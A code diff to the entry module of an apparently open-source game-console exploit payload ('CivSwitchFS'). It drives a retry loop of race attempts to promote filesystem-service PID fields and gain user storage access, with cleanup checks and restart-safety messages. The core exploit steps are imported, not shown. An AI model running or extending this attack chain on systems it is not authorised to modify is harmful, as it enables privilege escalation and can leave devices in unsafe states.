@@ -4,7 +4,8 @@
 // retains the promoted session and candidate storage, and cleans up other handles.
 // See README.md and HOW_IT_WORKS.md for full details.
 
-import coreRuntime, {setLogPolicy, waitMs} from "./core/runtime.mjs";
+import coreRuntime, {waitMs} from "./core/runtime.mjs";
+import {PAYLOAD_VERSION} from "./version.mjs";
 import {createFspIdentityConfig, VERBOSE_LOGGING} from "./core/config.mjs";
 import {
   borrowRawThreadScheduling,
@@ -34,7 +35,8 @@ import {
 } from "./core/steps/discovery.mjs";
 import {
   retireCandidateCacheAndClose,
-  cleanupScratchAndHandles
+  cleanupScratchAndHandles,
+  formatUnsafeState
 } from "./core/steps/cleanup.mjs";
 import {createFspIdentityHelpers} from "./core/helpers/index.mjs";
 import {runPromotionStep} from "./core/promotion.mjs";
@@ -52,14 +54,13 @@ import {
 import {
     setVerboseLogging,
     isVerboseLogging,
-    stageOnlyLog,
-    emitStage,
-    emitVerboseStage
-} from "./core/log-stage.mjs";
+    log,
+    verboseLog
+} from "./core/logger.mjs";
 import {
     clearVisualLog,
     installRunInputControls,
-    installVisualLogPatch
+    installLoaderLogPatch
 } from "./core/visuals.mjs";
 
 const {
@@ -67,20 +68,12 @@ const {
     beginAllocationTracking,
     checkWindow,
     closeHandle,
-    cloneObject,
     cmifReply,
     endAllocationTracking,
     extractRoleTimings,
     freeTrackedAllocations,
-    getMountHandle,
     ipcCommitChecked,
-    ipcCreateDirectoryChecked,
-    ipcDeleteFileChecked,
     ipcDeleteDirectoryRecursivelyChecked,
-    ipcGetEntryTypeChecked,
-    ipcReadFileChecked,
-    ipcRenameFileChecked,
-    ipcWriteFileChecked,
     prepPacket,
     read32,
     readAllocationCounters,
@@ -91,54 +84,42 @@ const {
 } = coreRuntime;
 
 const BASE_ATTEMPTS = 10;
-const MAX_TOTAL_ATTEMPTS = 30;
+const MAX_TOTAL_ATTEMPTS = BASE_ATTEMPTS + 1; // Final allocation-order fallback.
 const RETRY_PAUSE_MS = 100;
 const SCRATCH_DIR = "/hole";
 const NOT_FOUND = 0x202;
-const TIMING_SAVE_DIR = "/civswitchfs";
-const TIMING_SAVE_PATH = TIMING_SAVE_DIR + "/timings.json";
-const TIMING_SAVE_TEMP_PATH = TIMING_SAVE_PATH + ".tmp";
-const TIMING_SAVE_DISPLAY_PATH = "save:" + TIMING_SAVE_PATH;
-const TIMING_SAVE_VERSION = 1;
-const MAX_TIMING_SAVE_BYTES = 1024;
-const MAX_TIMING_DELAY_NS = 10000000;
 
 // ---------------------------------------------------------------------------
 // Entry point (bounded retry loop)
 // ---------------------------------------------------------------------------
 
 export async function run() {
-    installVisualLogPatch();
-    const previousVerboseLogging = setVerboseLogging(VERBOSE_LOGGING);
-    const previousLogPolicy = setLogPolicy(stageOnlyLog);
-    const timingPersistence = {
-        checked: false,
-        loaded: false,
-        adjustedThisRun: false,
-        savedThisRun: false,
-        deletedThisRun: false,
-        resetRequested: false,
-        resetPending: false,
-        useDefaultsThisAttempt: false,
-        stopRequested: false,
-        saveError: null,
-        resetLogPromise: Promise.resolve(),
-        stopLogPromise: Promise.resolve(),
-        verbosityLogPromise: Promise.resolve()
-    };
+    installLoaderLogPatch();
     const defaultTimingConfig = createFspIdentityConfig();
-    const builtInTimingSchedule = {
-        roleDelays: defaultTimingConfig.roleDelays.slice(),
-        guardDelays: defaultTimingConfig.guardDelays.slice(),
-        baselineRoleDelays: defaultTimingConfig.roleDelays.slice(),
-        baselineGuardDelays: defaultTimingConfig.guardDelays.slice()
+    const experimentMode = defaultTimingConfig.CANARY_BENCH_MODE === true;
+
+    if (experimentMode) {
+        await clearVisualLog();
+    }
+
+    const previousVerboseLogging = setVerboseLogging(
+        VERBOSE_LOGGING || experimentMode);
+    const runControl = {
+        stopRequested: false,
+        stopLogPromise: Promise.resolve(),
+        verbosityLogPromise: Promise.resolve(),
+        currentAttempt: 0,
+        deferredWaveLogLines: []
     };
     let inputControls = null;
+    let positiveAttemptsTotal = 0;
+    let positiveWindowsTotal = 0;
+    let qualifiedCanaryFlipsTotal = 0;
 
     try {
         function queueVerbosityMessage(message) {
-            timingPersistence.verbosityLogPromise =
-                timingPersistence.verbosityLogPromise.then(() => emitStage(message))
+            runControl.verbosityLogPromise =
+                runControl.verbosityLogPromise.then(() => log(message))
                     .catch(() => {});
         }
 
@@ -150,64 +131,55 @@ export async function run() {
                     ? "Verbose logging enabled (controller Y switches to normal)."
                     : "Normal logging enabled.");
             },
-            onResetTimings() {
-                timingPersistence.resetRequested = true;
-                timingPersistence.resetPending = true;
-                timingPersistence.resetLogPromise =
-                    timingPersistence.resetLogPromise.then(() => emitStage(
-                        "X pressed: the next attempt, if one runs, will use built-in timings; " +
-                        TIMING_SAVE_DISPLAY_PATH +
-                        " will be deleted when this run ends.")
-                    ).catch(() => {});
-            },
             onStop() {
-                if (timingPersistence.stopRequested) return;
-                timingPersistence.stopRequested = true;
-                timingPersistence.stopLogPromise = emitStage(
+                if (runControl.stopRequested) return;
+                runControl.stopRequested = true;
+                runControl.stopLogPromise = log(
                     "B/cancel pressed: stop requested. The current wave, if any, will finish; " +
                     "no further waves or attempts will launch.")
                     .catch(() => {});
             }
         });
 
-        let canaryTimingSchedule = null;
         let attemptLimit = BASE_ATTEMPTS;
-        let positiveAttemptsTotal = 0;
-        let positiveWindowsTotal = 0;
+        let usePreReservation = false;
+        let preReservationFallbackUsed = false;
 
-        await emitStage("CivSwitchFS (no RPC) by Nerisma\n" +
-            "Thanks to Slapah (civ port)\n" +
-            "Thanks to Pespipu (original ns2jb)\n" +
-            "Thanks to Kurumuz (ns2jb improvements)");
-        await emitStage(isVerboseLogging()
+        await log(
+            "==========================\n" +
+            "CivSwitchFS (no RPC) by Nerisma\n" +
+            "Thanks to Slapah, Pepsipu, Kurumuz and Alula\n" +
+            "==========================");
+        await log("CivSwitchFS-kaihen payload v" + PAYLOAD_VERSION);
+        await log(isVerboseLogging()
             ? "Verbose logging is on (controller Y toggles the mode)."
             : "Normal logging is on (controller Y enables verbose summaries).");
-        await emitStage("Checking for saved timings...");
+        await log("Using the built-in race timing schedule.");
         for (let attempt = 1; attempt <= attemptLimit; attempt++) {
-            if (timingPersistence.stopRequested) return;
-            await emitStage("======== ATTEMPT " + attempt + " ========");
-            if (timingPersistence.stopRequested) return;
-            if (timingPersistence.resetPending) {
-                canaryTimingSchedule = copyCanaryTimingSchedule(
-                    builtInTimingSchedule);
-                timingPersistence.resetPending = false;
-                timingPersistence.useDefaultsThisAttempt = true;
-            } else {
-                timingPersistence.useDefaultsThisAttempt = false;
+            if (runControl.stopRequested) return;
+            await log("======== ATTEMPT " + attempt + " ========");
+            if (usePreReservation) {
+                await log("Retrying with the reservation group opened before " +
+                    "candidate storage.");
             }
-            // The hard-cap attempt verifies the last schedule without retuning.
-            const result = await runTrackedAttempt(canaryTimingSchedule,
-                attempt < MAX_TOTAL_ATTEMPTS, timingPersistence);
+            if (runControl.stopRequested) return;
+            runControl.currentAttempt = attempt;
+            const result = await runTrackedAttempt(usePreReservation,
+                runControl);
             positiveAttemptsTotal += result.positiveAttempts || 0;
             positiveWindowsTotal += result.positiveWindows || 0;
+            qualifiedCanaryFlipsTotal += result.qualifiedCanaryFlips || 0;
 
-            if (timingPersistence.stopRequested || result.stoppedByUser)
+            if (runControl.stopRequested || result.stoppedByUser) {
+                await logSafeRestartStatus(result);
                 return;
+            }
 
             if (result.permissionProven) {
                 if (result.promotionRestored && result.safeToRetry) {
-                    await emitStage("Attempt complete.");
+                    await log("Attempt complete.");
                 }
+                await logSafeRestartStatus(result);
                 return;
             }
 
@@ -215,23 +187,27 @@ export async function run() {
                 return;
             }
 
-            canaryTimingSchedule = copyCanaryTimingSchedule(
-                result.canaryTimingSchedule) || canaryTimingSchedule;
-
-            if (result.timingAdjustments?.length) {
-                const timingSource = result.timingAdjustments.some(
-                    adjustment => adjustment.source === "control")
-                    ? " from control waves" : "";
-                if (attemptLimit < MAX_TOTAL_ATTEMPTS) {
-                    attemptLimit++;
-                    await emitStage("Timing changed" + timingSource +
-                        "; extending the campaign to " +
-                        attemptLimit + " attempts so the adjusted schedule can be tested.");
-                } else if (attempt < MAX_TOTAL_ATTEMPTS) {
-                    await emitStage("Timing changed" + timingSource + "; attempt " +
-                        MAX_TOTAL_ATTEMPTS +
-                        " is reserved to validate the adjusted schedule.");
+            if (result.retryWithPreReservation &&
+                !preReservationFallbackUsed &&
+                attempt < MAX_TOTAL_ATTEMPTS) {
+                preReservationFallbackUsed = true;
+                usePreReservation = true;
+                if (attempt === attemptLimit &&
+                    attempt < MAX_TOTAL_ATTEMPTS) {
+                    attemptLimit = attempt + 1;
+                    await log("Adding one attempt to test the alternate " +
+                        "candidate allocation order.");
                 }
+                await log("Cleanup was verified. The next attempt will open " +
+                    "the reservation group before candidate storage.");
+            } else if (result.retryWithPreReservation &&
+                !preReservationFallbackUsed) {
+                await log("The hard attempt limit was reached; the alternate " +
+                    "candidate allocation order was not tested.");
+            } else if (usePreReservation && result.preReservationTested) {
+                usePreReservation = false;
+                await log("The reservation-first candidate attempt finished; " +
+                    "later attempts will use the default order.");
             }
 
             if (attempt === attemptLimit) {
@@ -246,420 +222,96 @@ export async function run() {
                     rate >= WINDOW_RATE_THRESHOLD
                     ? " Restart the game before another run."
                     : "";
-                await emitStage("Stopped after " + attempt +
-                    " attempts; user storage access was not verified. " +
+                await log("Stopped after " + attempt +
+                    " attempts; user storage access was not verified.\n" +
                     windowSummary + restartHint);
+                await logSafeRestartStatus(result);
                 return;
             }
 
             await waitMs(RETRY_PAUSE_MS);
         }
     } catch (error) {
-        await emitStage("Unexpected error. Checking cleanup status.");
-        await emitVerboseStage("Workflow error: " + String(error?.message || error));
+        await log("Unexpected error. Checking cleanup status.");
+        await verboseLog("Workflow error: " + String(error?.message || error));
     } finally {
         await waitMs(0);
         try {
-            await timingPersistence.verbosityLogPromise;
-            if (timingPersistence.stopRequested)
-                await timingPersistence.stopLogPromise;
-            if (timingPersistence.resetRequested) {
-                await timingPersistence.resetLogPromise;
-                await emitStage("Deleting saved timing configuration...");
-                let deleted;
-                try {
-                    deleted = deleteTimingScheduleFromFreshSaveHandle();
-                } catch (error) {
-                    deleted = {ok: false,
-                        error: String(error?.message || error)};
-                }
-                if (deleted.ok) {
-                    timingPersistence.deletedThisRun = true;
-                    await emitStage(deleted.deletedPaths.length
-                        ? "Deleted saved timing configuration from " +
-                            TIMING_SAVE_DISPLAY_PATH + "."
-                        : "No saved timing configuration remained at " +
-                            TIMING_SAVE_DISPLAY_PATH + ".");
-                } else {
-                    await emitStage("Could not delete saved timing configuration from " +
-                        TIMING_SAVE_DISPLAY_PATH + " (" + deleted.error + ").");
-                }
-                if (deleted.cleanupWarning)
-                    await emitVerboseStage("Timing config deletion cleanup: " +
-                        deleted.cleanupWarning);
-            }
+            await runControl.verbosityLogPromise;
+            if (runControl.stopRequested)
+                await runControl.stopLogPromise;
         } finally {
             inputControls?.clearRunActions?.();
             inputControls?.dispose?.();
-            setLogPolicy(previousLogPolicy);
             setVerboseLogging(previousVerboseLogging);
+            try {
+                let finalSummary = null;
+                if (experimentMode) {
+                    finalSummary = formatCanaryFlipSummary(
+                        qualifiedCanaryFlipsTotal, positiveAttemptsTotal);
+                }
+
+                await flushDeferredWaveLogLines(
+                    runControl.deferredWaveLogLines,
+                    finalSummary);
+            } catch (error) {
+                try {
+                    await log("Could not display deferred wave logs: " +
+                        String(error?.message || error));
+                } catch (logError) {}
+            }
         }
     }
 }
 
-function copyCanaryTimingSchedule(schedule) {
-    if (!schedule || !Array.isArray(schedule.roleDelays) ||
-        !Array.isArray(schedule.guardDelays) ||
-        !Array.isArray(schedule.baselineRoleDelays) ||
-        !Array.isArray(schedule.baselineGuardDelays)) return null;
-    return {
-        roleDelays: schedule.roleDelays.slice(),
-        guardDelays: schedule.guardDelays.slice(),
-        baselineRoleDelays: schedule.baselineRoleDelays.slice(),
-        baselineGuardDelays: schedule.baselineGuardDelays.slice()
-    };
+async function logSafeRestartStatus(result) {
+    if (!result?.safeToRetry) {
+        return;
+    }
+
+    await log("STATE IS SAFE TO RESTART - Relaunch the game normally; " +
+        "no hard reboot needed.");
 }
 
-function formatFinalTimingSchedule(schedule, timingPersistence) {
-    if (!schedule || !isValidTimingValues(
-        schedule.roleDelays, schedule.guardDelays)) {
-        return ["Final timing values are unavailable."];
+function formatCanaryFlipSummary(qualifiedFlips, positiveWaves) {
+    // Controls are excluded, and only flips passing every canary gate count.
+    if (!positiveWaves) {
+        return "CANARY FLIP SUMMARY: flips=0 non-flips=0 rate=n/a " +
+            "(no positive waves).";
     }
 
-    if (timingPersistence?.resetRequested) {
-        return [];
-    }
-
-    if (timingPersistence?.adjustedThisRun &&
-        !timingPersistence.savedThisRun) {
-        return [
-            "Adjusted timings could not be saved to " +
-                TIMING_SAVE_DISPLAY_PATH + "; current values:",
-            "var roleDelays = [" + schedule.roleDelays.join(", ") + "];",
-            "var guardDelays = [" + schedule.guardDelays.join(", ") + "];"
-        ];
-    }
-
-    if (timingPersistence?.savedThisRun || timingPersistence?.loaded) {
-        return ["Adjusted timings have been saved in " +
-            TIMING_SAVE_DISPLAY_PATH + "."];
-    }
-
-    return [];
+    const nonFlips = positiveWaves - qualifiedFlips;
+    const rate = (100 * qualifiedFlips / positiveWaves).toFixed(1);
+    return "CANARY FLIP SUMMARY: flips=" + qualifiedFlips +
+        " non-flips=" + nonFlips + " rate=" + rate + "% (" +
+        qualifiedFlips + "/" + positiveWaves + " positive waves).";
 }
 
 async function beginCleanupLog(attemptState) {
     if (attemptState.cleanupLogStarted) return;
     attemptState.cleanupLogStarted = true;
-    await emitStage("Cleaning up...");
+    await log("Cleaning up...");
 }
 
-function isValidTimingArray(values, expectedLength) {
-    if (!Array.isArray(values) || values.length !== expectedLength ||
-        !values.every(value => Number.isSafeInteger(value) && value >= 0 &&
-            value <= MAX_TIMING_DELAY_NS)) return false;
-    for (let i = 1; i < values.length; i++)
-        if (values[i] - values[i - 1] < 50000) return false;
-    return true;
-}
-
-function isValidTimingValues(roleDelays, guardDelays) {
-    return isValidTimingArray(roleDelays, 10) &&
-        isValidTimingArray(guardDelays, 2);
-}
-
-function loadTimingScheduleFromSave(handle) {
-    if (!handle) return {status: "unavailable", detail: "save handle unavailable"};
-
-    let result = {status: "unavailable", detail: "timing file unavailable"};
-    try {
-        const entry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_PATH);
-        if (entry.transport !== 0) {
-            result = {status: "unavailable", detail: "entry transport " +
-                timingHex(entry.transport)};
-        } else if (entry.result === NOT_FOUND) {
-            result = {status: "missing"};
-        } else if (entry.result !== 0) {
-            result = {status: "unavailable", detail: "entry result " +
-                timingHex(entry.result)};
-        } else if (entry.type !== 1) {
-            result = {status: "invalid", detail: "timing path is not a file"};
-        } else {
-            const read = ipcReadFileChecked(handle, TIMING_SAVE_PATH,
-                MAX_TIMING_SAVE_BYTES);
-            if (!read.ok) {
-                result = {status: "invalid", detail: "read " + read.stage +
-                    (read.transport !== null && read.transport !== 0
-                        ? " transport " + timingHex(read.transport) : "") +
-                    (read.result !== null && read.result !== 0
-                        ? " result " + timingHex(read.result) : "")};
-            } else {
-                let json = "";
-                for (const byte of read.bytes)
-                    json += String.fromCharCode(byte);
-                const data = JSON.parse(json);
-                if (data?.version !== TIMING_SAVE_VERSION ||
-                    !isValidTimingValues(data.roleDelays, data.guardDelays)) {
-                    result = {status: "invalid",
-                        detail: "unsupported or invalid timing data"};
-                } else {
-                    result = {status: "loaded", schedule: {
-                        roleDelays: data.roleDelays.slice(),
-                        guardDelays: data.guardDelays.slice()
-                    }};
-                }
-            }
-        }
-    } catch (error) {
-        result = {status: "invalid", detail: String(error?.message || error)};
-    }
-    return result;
-}
-
-function persistTimingSchedule(handle, schedule) {
-    if (!handle || !schedule || !isValidTimingValues(
-        schedule.roleDelays, schedule.guardDelays)) {
-        return {ok: false, error: "invalid timing schedule or save handle"};
+async function flushDeferredWaveLogLines(lines, finalSummary = null) {
+    const hasWaveLines = Array.isArray(lines) && lines.length > 0;
+    if (!hasWaveLines && !finalSummary) {
+        return;
     }
 
-    try {
-        const directory = ipcGetEntryTypeChecked(handle, TIMING_SAVE_DIR);
-        if (directory.transport !== 0)
-            throw new Error("directory transport " + timingHex(directory.transport));
-        if (directory.result === NOT_FOUND) {
-            requireTimingFsSuccess("create directory",
-                ipcCreateDirectoryChecked(handle, TIMING_SAVE_DIR));
-        } else if (directory.result !== 0) {
-            throw new Error("directory result " + timingHex(directory.result));
-        } else if (directory.type !== 0) {
-            throw new Error("timing directory path is not a directory");
+    if (hasWaveLines) {
+        // The logger appends synchronously; wait once after all chunks are queued.
+        void log("Detailed wave output follows; it was held until the run ended.");
+        for (let flushFrom = 0; flushFrom < lines.length; flushFrom += 6) {
+            void log(lines.slice(flushFrom, flushFrom + 6).join("\n"));
         }
-
-        const tempEntry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_TEMP_PATH);
-        if (tempEntry.transport !== 0)
-            throw new Error("temporary entry transport " + timingHex(tempEntry.transport));
-        if (tempEntry.result === 0) {
-            if (tempEntry.type !== 1)
-                throw new Error("temporary timing path is not a file");
-            requireTimingFsSuccess("remove stale temporary file",
-                ipcDeleteFileChecked(handle, TIMING_SAVE_TEMP_PATH));
-        } else if (tempEntry.result !== NOT_FOUND) {
-            throw new Error("temporary entry result " + timingHex(tempEntry.result));
-        }
-
-        const serialized = JSON.stringify({version: TIMING_SAVE_VERSION,
-            roleDelays: schedule.roleDelays,
-            guardDelays: schedule.guardDelays});
-        const bytes = [];
-        for (let i = 0; i < serialized.length; i++)
-            bytes.push(serialized.charCodeAt(i));
-        const written = ipcWriteFileChecked(handle, TIMING_SAVE_TEMP_PATH, bytes);
-        if (!written.ok)
-            throw new Error("write temporary file " + written.stage +
-                (written.transport !== null && written.transport !== 0
-                    ? " transport " + timingHex(written.transport) : "") +
-                (written.result !== null && written.result !== 0
-                    ? " result " + timingHex(written.result) : ""));
-
-        const staged = ipcReadFileChecked(handle, TIMING_SAVE_TEMP_PATH,
-            MAX_TIMING_SAVE_BYTES);
-        if (!staged.ok)
-            throw new Error("temporary file readback " + staged.stage +
-                (staged.transport !== null && staged.transport !== 0
-                    ? " transport " + timingHex(staged.transport) : "") +
-                (staged.result !== null && staged.result !== 0
-                    ? " result " + timingHex(staged.result) : ""));
-        const stagedMismatch = timingBytesMismatch(bytes, staged.bytes);
-        if (stagedMismatch)
-            throw new Error("temporary file readback mismatch: " + stagedMismatch);
-
-        const targetEntry = ipcGetEntryTypeChecked(handle, TIMING_SAVE_PATH);
-        if (targetEntry.transport !== 0)
-            throw new Error("target entry transport " + timingHex(targetEntry.transport));
-        if (targetEntry.result === 0) {
-            if (targetEntry.type !== 1)
-                throw new Error("timing save path is not a file");
-            requireTimingFsSuccess("remove old timing file",
-                ipcDeleteFileChecked(handle, TIMING_SAVE_PATH));
-        } else if (targetEntry.result !== NOT_FOUND) {
-            throw new Error("target entry result " + timingHex(targetEntry.result));
-        }
-
-        requireTimingFsSuccess("publish timing file",
-            ipcRenameFileChecked(handle, TIMING_SAVE_TEMP_PATH,
-                TIMING_SAVE_PATH));
-        requireTimingFsSuccess("commit timing file", ipcCommitChecked(handle));
-
-        const saved = ipcReadFileChecked(handle, TIMING_SAVE_PATH,
-            MAX_TIMING_SAVE_BYTES);
-        if (!saved.ok)
-            throw new Error("saved timing file readback " + saved.stage +
-                (saved.transport !== null && saved.transport !== 0
-                    ? " transport " + timingHex(saved.transport) : "") +
-                (saved.result !== null && saved.result !== 0
-                    ? " result " + timingHex(saved.result) : ""));
-        const savedMismatch = timingBytesMismatch(bytes, saved.bytes);
-        if (savedMismatch)
-            throw new Error("saved timing file readback mismatch: " + savedMismatch);
-        return {ok: true};
-    } catch (error) {
-        return {ok: false, error: String(error?.message || error)};
-    }
-}
-
-function persistTimingScheduleFromFreshSaveHandle(schedule) {
-    const tracker = beginAllocationTracking();
-    if (!tracker)
-        return {ok: false, error: "could not start save allocation tracking"};
-
-    let handle = 0;
-    let result = {ok: false, error: "save mount unavailable"};
-    let cleanupWarning = null;
-    try {
-        const mount = getMountHandle("save");
-        if (!mount) throw new Error("save mount unavailable");
-        handle = cloneObject(mount.handle, mount.objId);
-        if (!handle) throw new Error("could not clone save mount");
-        result = persistTimingSchedule(handle, schedule);
-    } catch (error) {
-        result = {ok: false, error: String(error?.message || error)};
-    } finally {
-        if (handle) {
-            try {
-                const closeResult = Number(closeHandle(handle)) >>> 0;
-                if (closeResult !== 0)
-                    cleanupWarning = "save handle close " + timingHex(closeResult);
-            } catch (error) {
-                cleanupWarning = "save handle close threw: " +
-                    String(error?.message || error);
-            }
-        }
-
-        if (!endAllocationTracking(tracker)) {
-            cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
-                "save allocation tracking did not end cleanly";
-        } else {
-            const freed = freeTrackedAllocations(tracker);
-            if (!freed.ok)
-                cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
-                    "save buffer cleanup failed";
-        }
+        lines.length = 0;
     }
 
-    if (cleanupWarning) result.cleanupWarning = cleanupWarning;
-    return result;
-}
-
-function deleteTimingSchedule(handle) {
-    if (!handle) return {ok: false, error: "save handle unavailable"};
-
-    const deletedPaths = [];
-    const errors = [];
-    for (const path of [TIMING_SAVE_PATH, TIMING_SAVE_TEMP_PATH]) {
-        try {
-            const entry = ipcGetEntryTypeChecked(handle, path);
-            if (entry.transport !== 0)
-                throw new Error("entry transport " + timingHex(entry.transport));
-            if (entry.result === NOT_FOUND) continue;
-            if (entry.result !== 0)
-                throw new Error("entry result " + timingHex(entry.result));
-            if (entry.type !== 1)
-                throw new Error("timing path is not a file: " + path);
-
-            requireTimingFsSuccess("delete " + path,
-                ipcDeleteFileChecked(handle, path));
-            deletedPaths.push(path);
-        } catch (error) {
-            errors.push(path + ": " + String(error?.message || error));
-        }
+    if (finalSummary) {
+        void log(finalSummary);
     }
-
-    if (deletedPaths.length) {
-        try {
-            requireTimingFsSuccess("commit timing config deletion",
-                ipcCommitChecked(handle));
-        } catch (error) {
-            errors.push(String(error?.message || error));
-        }
-        for (const path of deletedPaths) {
-            try {
-                const entry = ipcGetEntryTypeChecked(handle, path);
-                if (entry.transport !== 0)
-                    throw new Error("verify deletion transport " +
-                        timingHex(entry.transport));
-                if (entry.result !== NOT_FOUND)
-                    throw new Error("verify deletion result " +
-                        timingHex(entry.result));
-            } catch (error) {
-                errors.push("verify " + path + ": " +
-                    String(error?.message || error));
-            }
-        }
-    }
-
-    return errors.length
-        ? {ok: false, error: errors.join("; "), deletedPaths}
-        : {ok: true, deletedPaths};
-}
-
-function deleteTimingScheduleFromFreshSaveHandle() {
-    const tracker = beginAllocationTracking();
-    if (!tracker)
-        return {ok: false, error: "could not start save allocation tracking"};
-
-    let handle = 0;
-    let result = {ok: false, error: "save mount unavailable"};
-    let cleanupWarning = null;
-    try {
-        const mount = getMountHandle("save");
-        if (!mount) throw new Error("save mount unavailable");
-        handle = cloneObject(mount.handle, mount.objId);
-        if (!handle) throw new Error("could not clone save mount");
-        result = deleteTimingSchedule(handle);
-    } catch (error) {
-        result = {ok: false, error: String(error?.message || error)};
-    } finally {
-        if (handle) {
-            try {
-                const closeResult = Number(closeHandle(handle)) >>> 0;
-                if (closeResult !== 0)
-                    cleanupWarning = "save handle close " + timingHex(closeResult);
-            } catch (error) {
-                cleanupWarning = "save handle close threw: " +
-                    String(error?.message || error);
-            }
-        }
-
-        if (!endAllocationTracking(tracker)) {
-            cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
-                "save allocation tracking did not end cleanly";
-        } else {
-            const freed = freeTrackedAllocations(tracker);
-            if (!freed.ok)
-                cleanupWarning = (cleanupWarning ? cleanupWarning + "; " : "") +
-                    "save buffer cleanup failed";
-        }
-    }
-
-    if (cleanupWarning) result.cleanupWarning = cleanupWarning;
-    return result;
-}
-
-function requireTimingFsSuccess(operation, reply) {
-    if (reply.transport !== 0)
-        throw new Error(operation + " transport " + timingHex(reply.transport));
-    if (reply.result !== 0)
-        throw new Error(operation + " result " + timingHex(reply.result));
-}
-
-function timingBytesMismatch(expected, actual) {
-    if (!actual) return "no bytes returned";
-    if (expected.length !== actual.length)
-        return "length expected " + expected.length + ", got " + actual.length;
-    for (let i = 0; i < expected.length; i++) {
-        if (expected[i] !== actual[i])
-            return "byte " + i + " expected " + timingByteHex(expected[i]) +
-                ", got " + timingByteHex(actual[i]);
-    }
-    return null;
-}
-
-function timingByteHex(value) {
-    return "0x" + (Number(value) & 0xFF).toString(16).padStart(2, "0");
-}
-
-function timingHex(value) {
-    return "0x" + (Number(value) >>> 0).toString(16).padStart(8, "0");
+    await log("Log display done");
 }
 
 function reportAddressProgress(message) {
@@ -667,9 +319,9 @@ function reportAddressProgress(message) {
 
     const concisePrefix = "ADDRESS_SCAN:";
     if (message.startsWith(concisePrefix))
-        return emitStage(message.slice(concisePrefix.length).trim());
+        return log(message.slice(concisePrefix.length).trim());
     if (message.startsWith("FSP root capture and scan in progress:"))
-        return emitStage("FSP root identity scan is halfway complete.");
+        return log("FSP root identity scan is halfway complete.");
     return Promise.resolve();
 }
 
@@ -678,16 +330,18 @@ function reportAddressProgress(message) {
 // Tracked attempt (one full attempt with allocation tracking)
 // ---------------------------------------------------------------------------
 
-async function runTrackedAttempt(canaryTimingSchedule,
-    allowTimingAdjustments = true, timingPersistence = null) {
+async function runTrackedAttempt(usePreReservation = false,
+    runControl = null) {
     const attemptState = {
+        usePreReservation: usePreReservation === true,
+        preReservationTested: false,
+        retryWithPreReservation: false,
         permissionProven: false,
         stoppedByUser: false,
+        qualifiedCanaryFlips: 0,
         pidPromotionVerified: false,
-        canaryTimingSchedule: copyCanaryTimingSchedule(canaryTimingSchedule),
         positiveAttempts: 0,
         positiveWindows: 0,
-        timingAdjustments: [],
         promotionRestored: false,
         cleanupVerified: false,
         workerStateSafe: true,
@@ -701,6 +355,7 @@ async function runTrackedAttempt(canaryTimingSchedule,
         holeCleanupHandle: 0,
         holeAbsentVerified: false,
         holeCleanupVerified: false,
+        holeCleanupDeferred: false,
         primaryCleanupAttempted: false,
         primaryCommitVerified: false,
         primaryScratchCleanupVerified: false,
@@ -714,7 +369,7 @@ async function runTrackedAttempt(canaryTimingSchedule,
 
     const tracker = beginAllocationTracking();
     if (!tracker) {
-        await emitStage("Could not start an attempt. Stopping.");
+        await log("Could not start an attempt. Stopping.");
         return attemptState;
     }
 
@@ -722,15 +377,14 @@ async function runTrackedAttempt(canaryTimingSchedule,
     let executionError = null;
 
     try {
-        await runPayload(attemptState, allowTimingAdjustments,
-            timingPersistence);
+        await runPayload(attemptState, runControl);
     } catch (error) {
         const errorName = error?.name && error.name !== "Error"
             ? error.name + ": " : "";
         executionError = errorName + String(error?.message || error);
-        await emitStage("Attempt failed: " + executionError +
+        await log("Attempt failed: " + executionError +
             "; checking cleanup.");
-        await emitVerboseStage("Attempt error: " + executionError);
+        await verboseLog("Attempt error: " + executionError);
     } finally {
         try {
             await beginCleanupLog(attemptState);
@@ -739,7 +393,7 @@ async function runTrackedAttempt(canaryTimingSchedule,
             executionError = executionError ||
                 "independent /hole cleanup threw: " +
                 String(error?.message || error);
-            await emitVerboseStage("Cleanup error: " + executionError);
+            await verboseLog("Cleanup error: " + executionError);
         } finally {
             trackingEnded = endAllocationTracking(tracker);
         }
@@ -774,26 +428,47 @@ async function runTrackedAttempt(canaryTimingSchedule,
     if (attemptState.promotionRetained) {
         const lightCleanupComplete = attemptState.lightCleanupVerified &&
             attemptState.holeCleanupVerified && trackingEnded;
-        await emitStage(lightCleanupComplete
-            ? "Temporary handles closed; fspSrv and candidate storage remain open."
-            : "Cleanup incomplete; fspSrv and candidate storage remain open.");
+        await log(lightCleanupComplete
+            ? "Temporary handles closed.\nfspSrv and candidate storage remain open."
+            : "Cleanup incomplete.\nfspSrv and candidate storage remain open.");
     } else if (attemptState.pidPromotionVerified) {
         const cleanupComplete = attemptState.cleanupVerified &&
             attemptState.holeCleanupVerified && trackingEnded &&
             attemptState.promotionTestHandlesClosed;
-        await emitStage(cleanupComplete
-            ? "Promotion complete; temporary handles closed; PID fields remain promoted."
-            : "Promotion complete; cleanup incomplete; PID fields remain promoted.");
+        await log(cleanupComplete
+            ? "Promotion complete; temporary handles closed.\nPID fields remain promoted."
+            : "Promotion complete, but cleanup incomplete.\nPID fields remain promoted.");
     } else if (attemptState.safeToRetry) {
-        await emitStage(attemptState.cleanupVerified
-            ? "Cleanup complete."
-            : "Cleanup is sufficient for another attempt.");
-    } else {
-        await emitStage("Cleanup failed; another attempt is unsafe.");
+        await log("STATE IS SAFE - continuing.");
+    } else if (!attemptState.retainedEndpointActive &&
+        attemptState.cacheRetirementVerified &&
+        attemptState.workerStateSafe &&
+        attemptState.workersQuiesced &&
+        !executionError) {
+        // The cache readback is a separate requirement: a clean entry avoids
+        // the dirty-flush hazard, but does not prove a fresh storage handle
+        // can no longer observe the alias.
+        await log("STATE IS SAFE TO RESTART - Relaunch the game normally; " +
+            "no hard reboot needed.");
+    } else if (!(attemptState.retainedEndpointActive &&
+            !attemptState.cacheRetirementVerified)) {
+        // No dedicated verdict fires for this ending: keep the explicit
+        // unknown-state instruction instead of a vague cleanup note.
+        await log("STATE IS UNKNOWN - hard reboot now " +
+            "(hold Power for 15 seconds).");
+    }
+
+    // The promotion-retained path keeps the endpoint on purpose, so an
+    // unretired cache there is not a retirement failure.
+    if (!attemptState.promotionRetained &&
+        attemptState.retainedEndpointActive &&
+        !attemptState.cacheRetirementVerified) {
+        await log(formatUnsafeState(
+            "Retained endpoint is active and cache retirement failed."));
     }
 
     if (executionError)
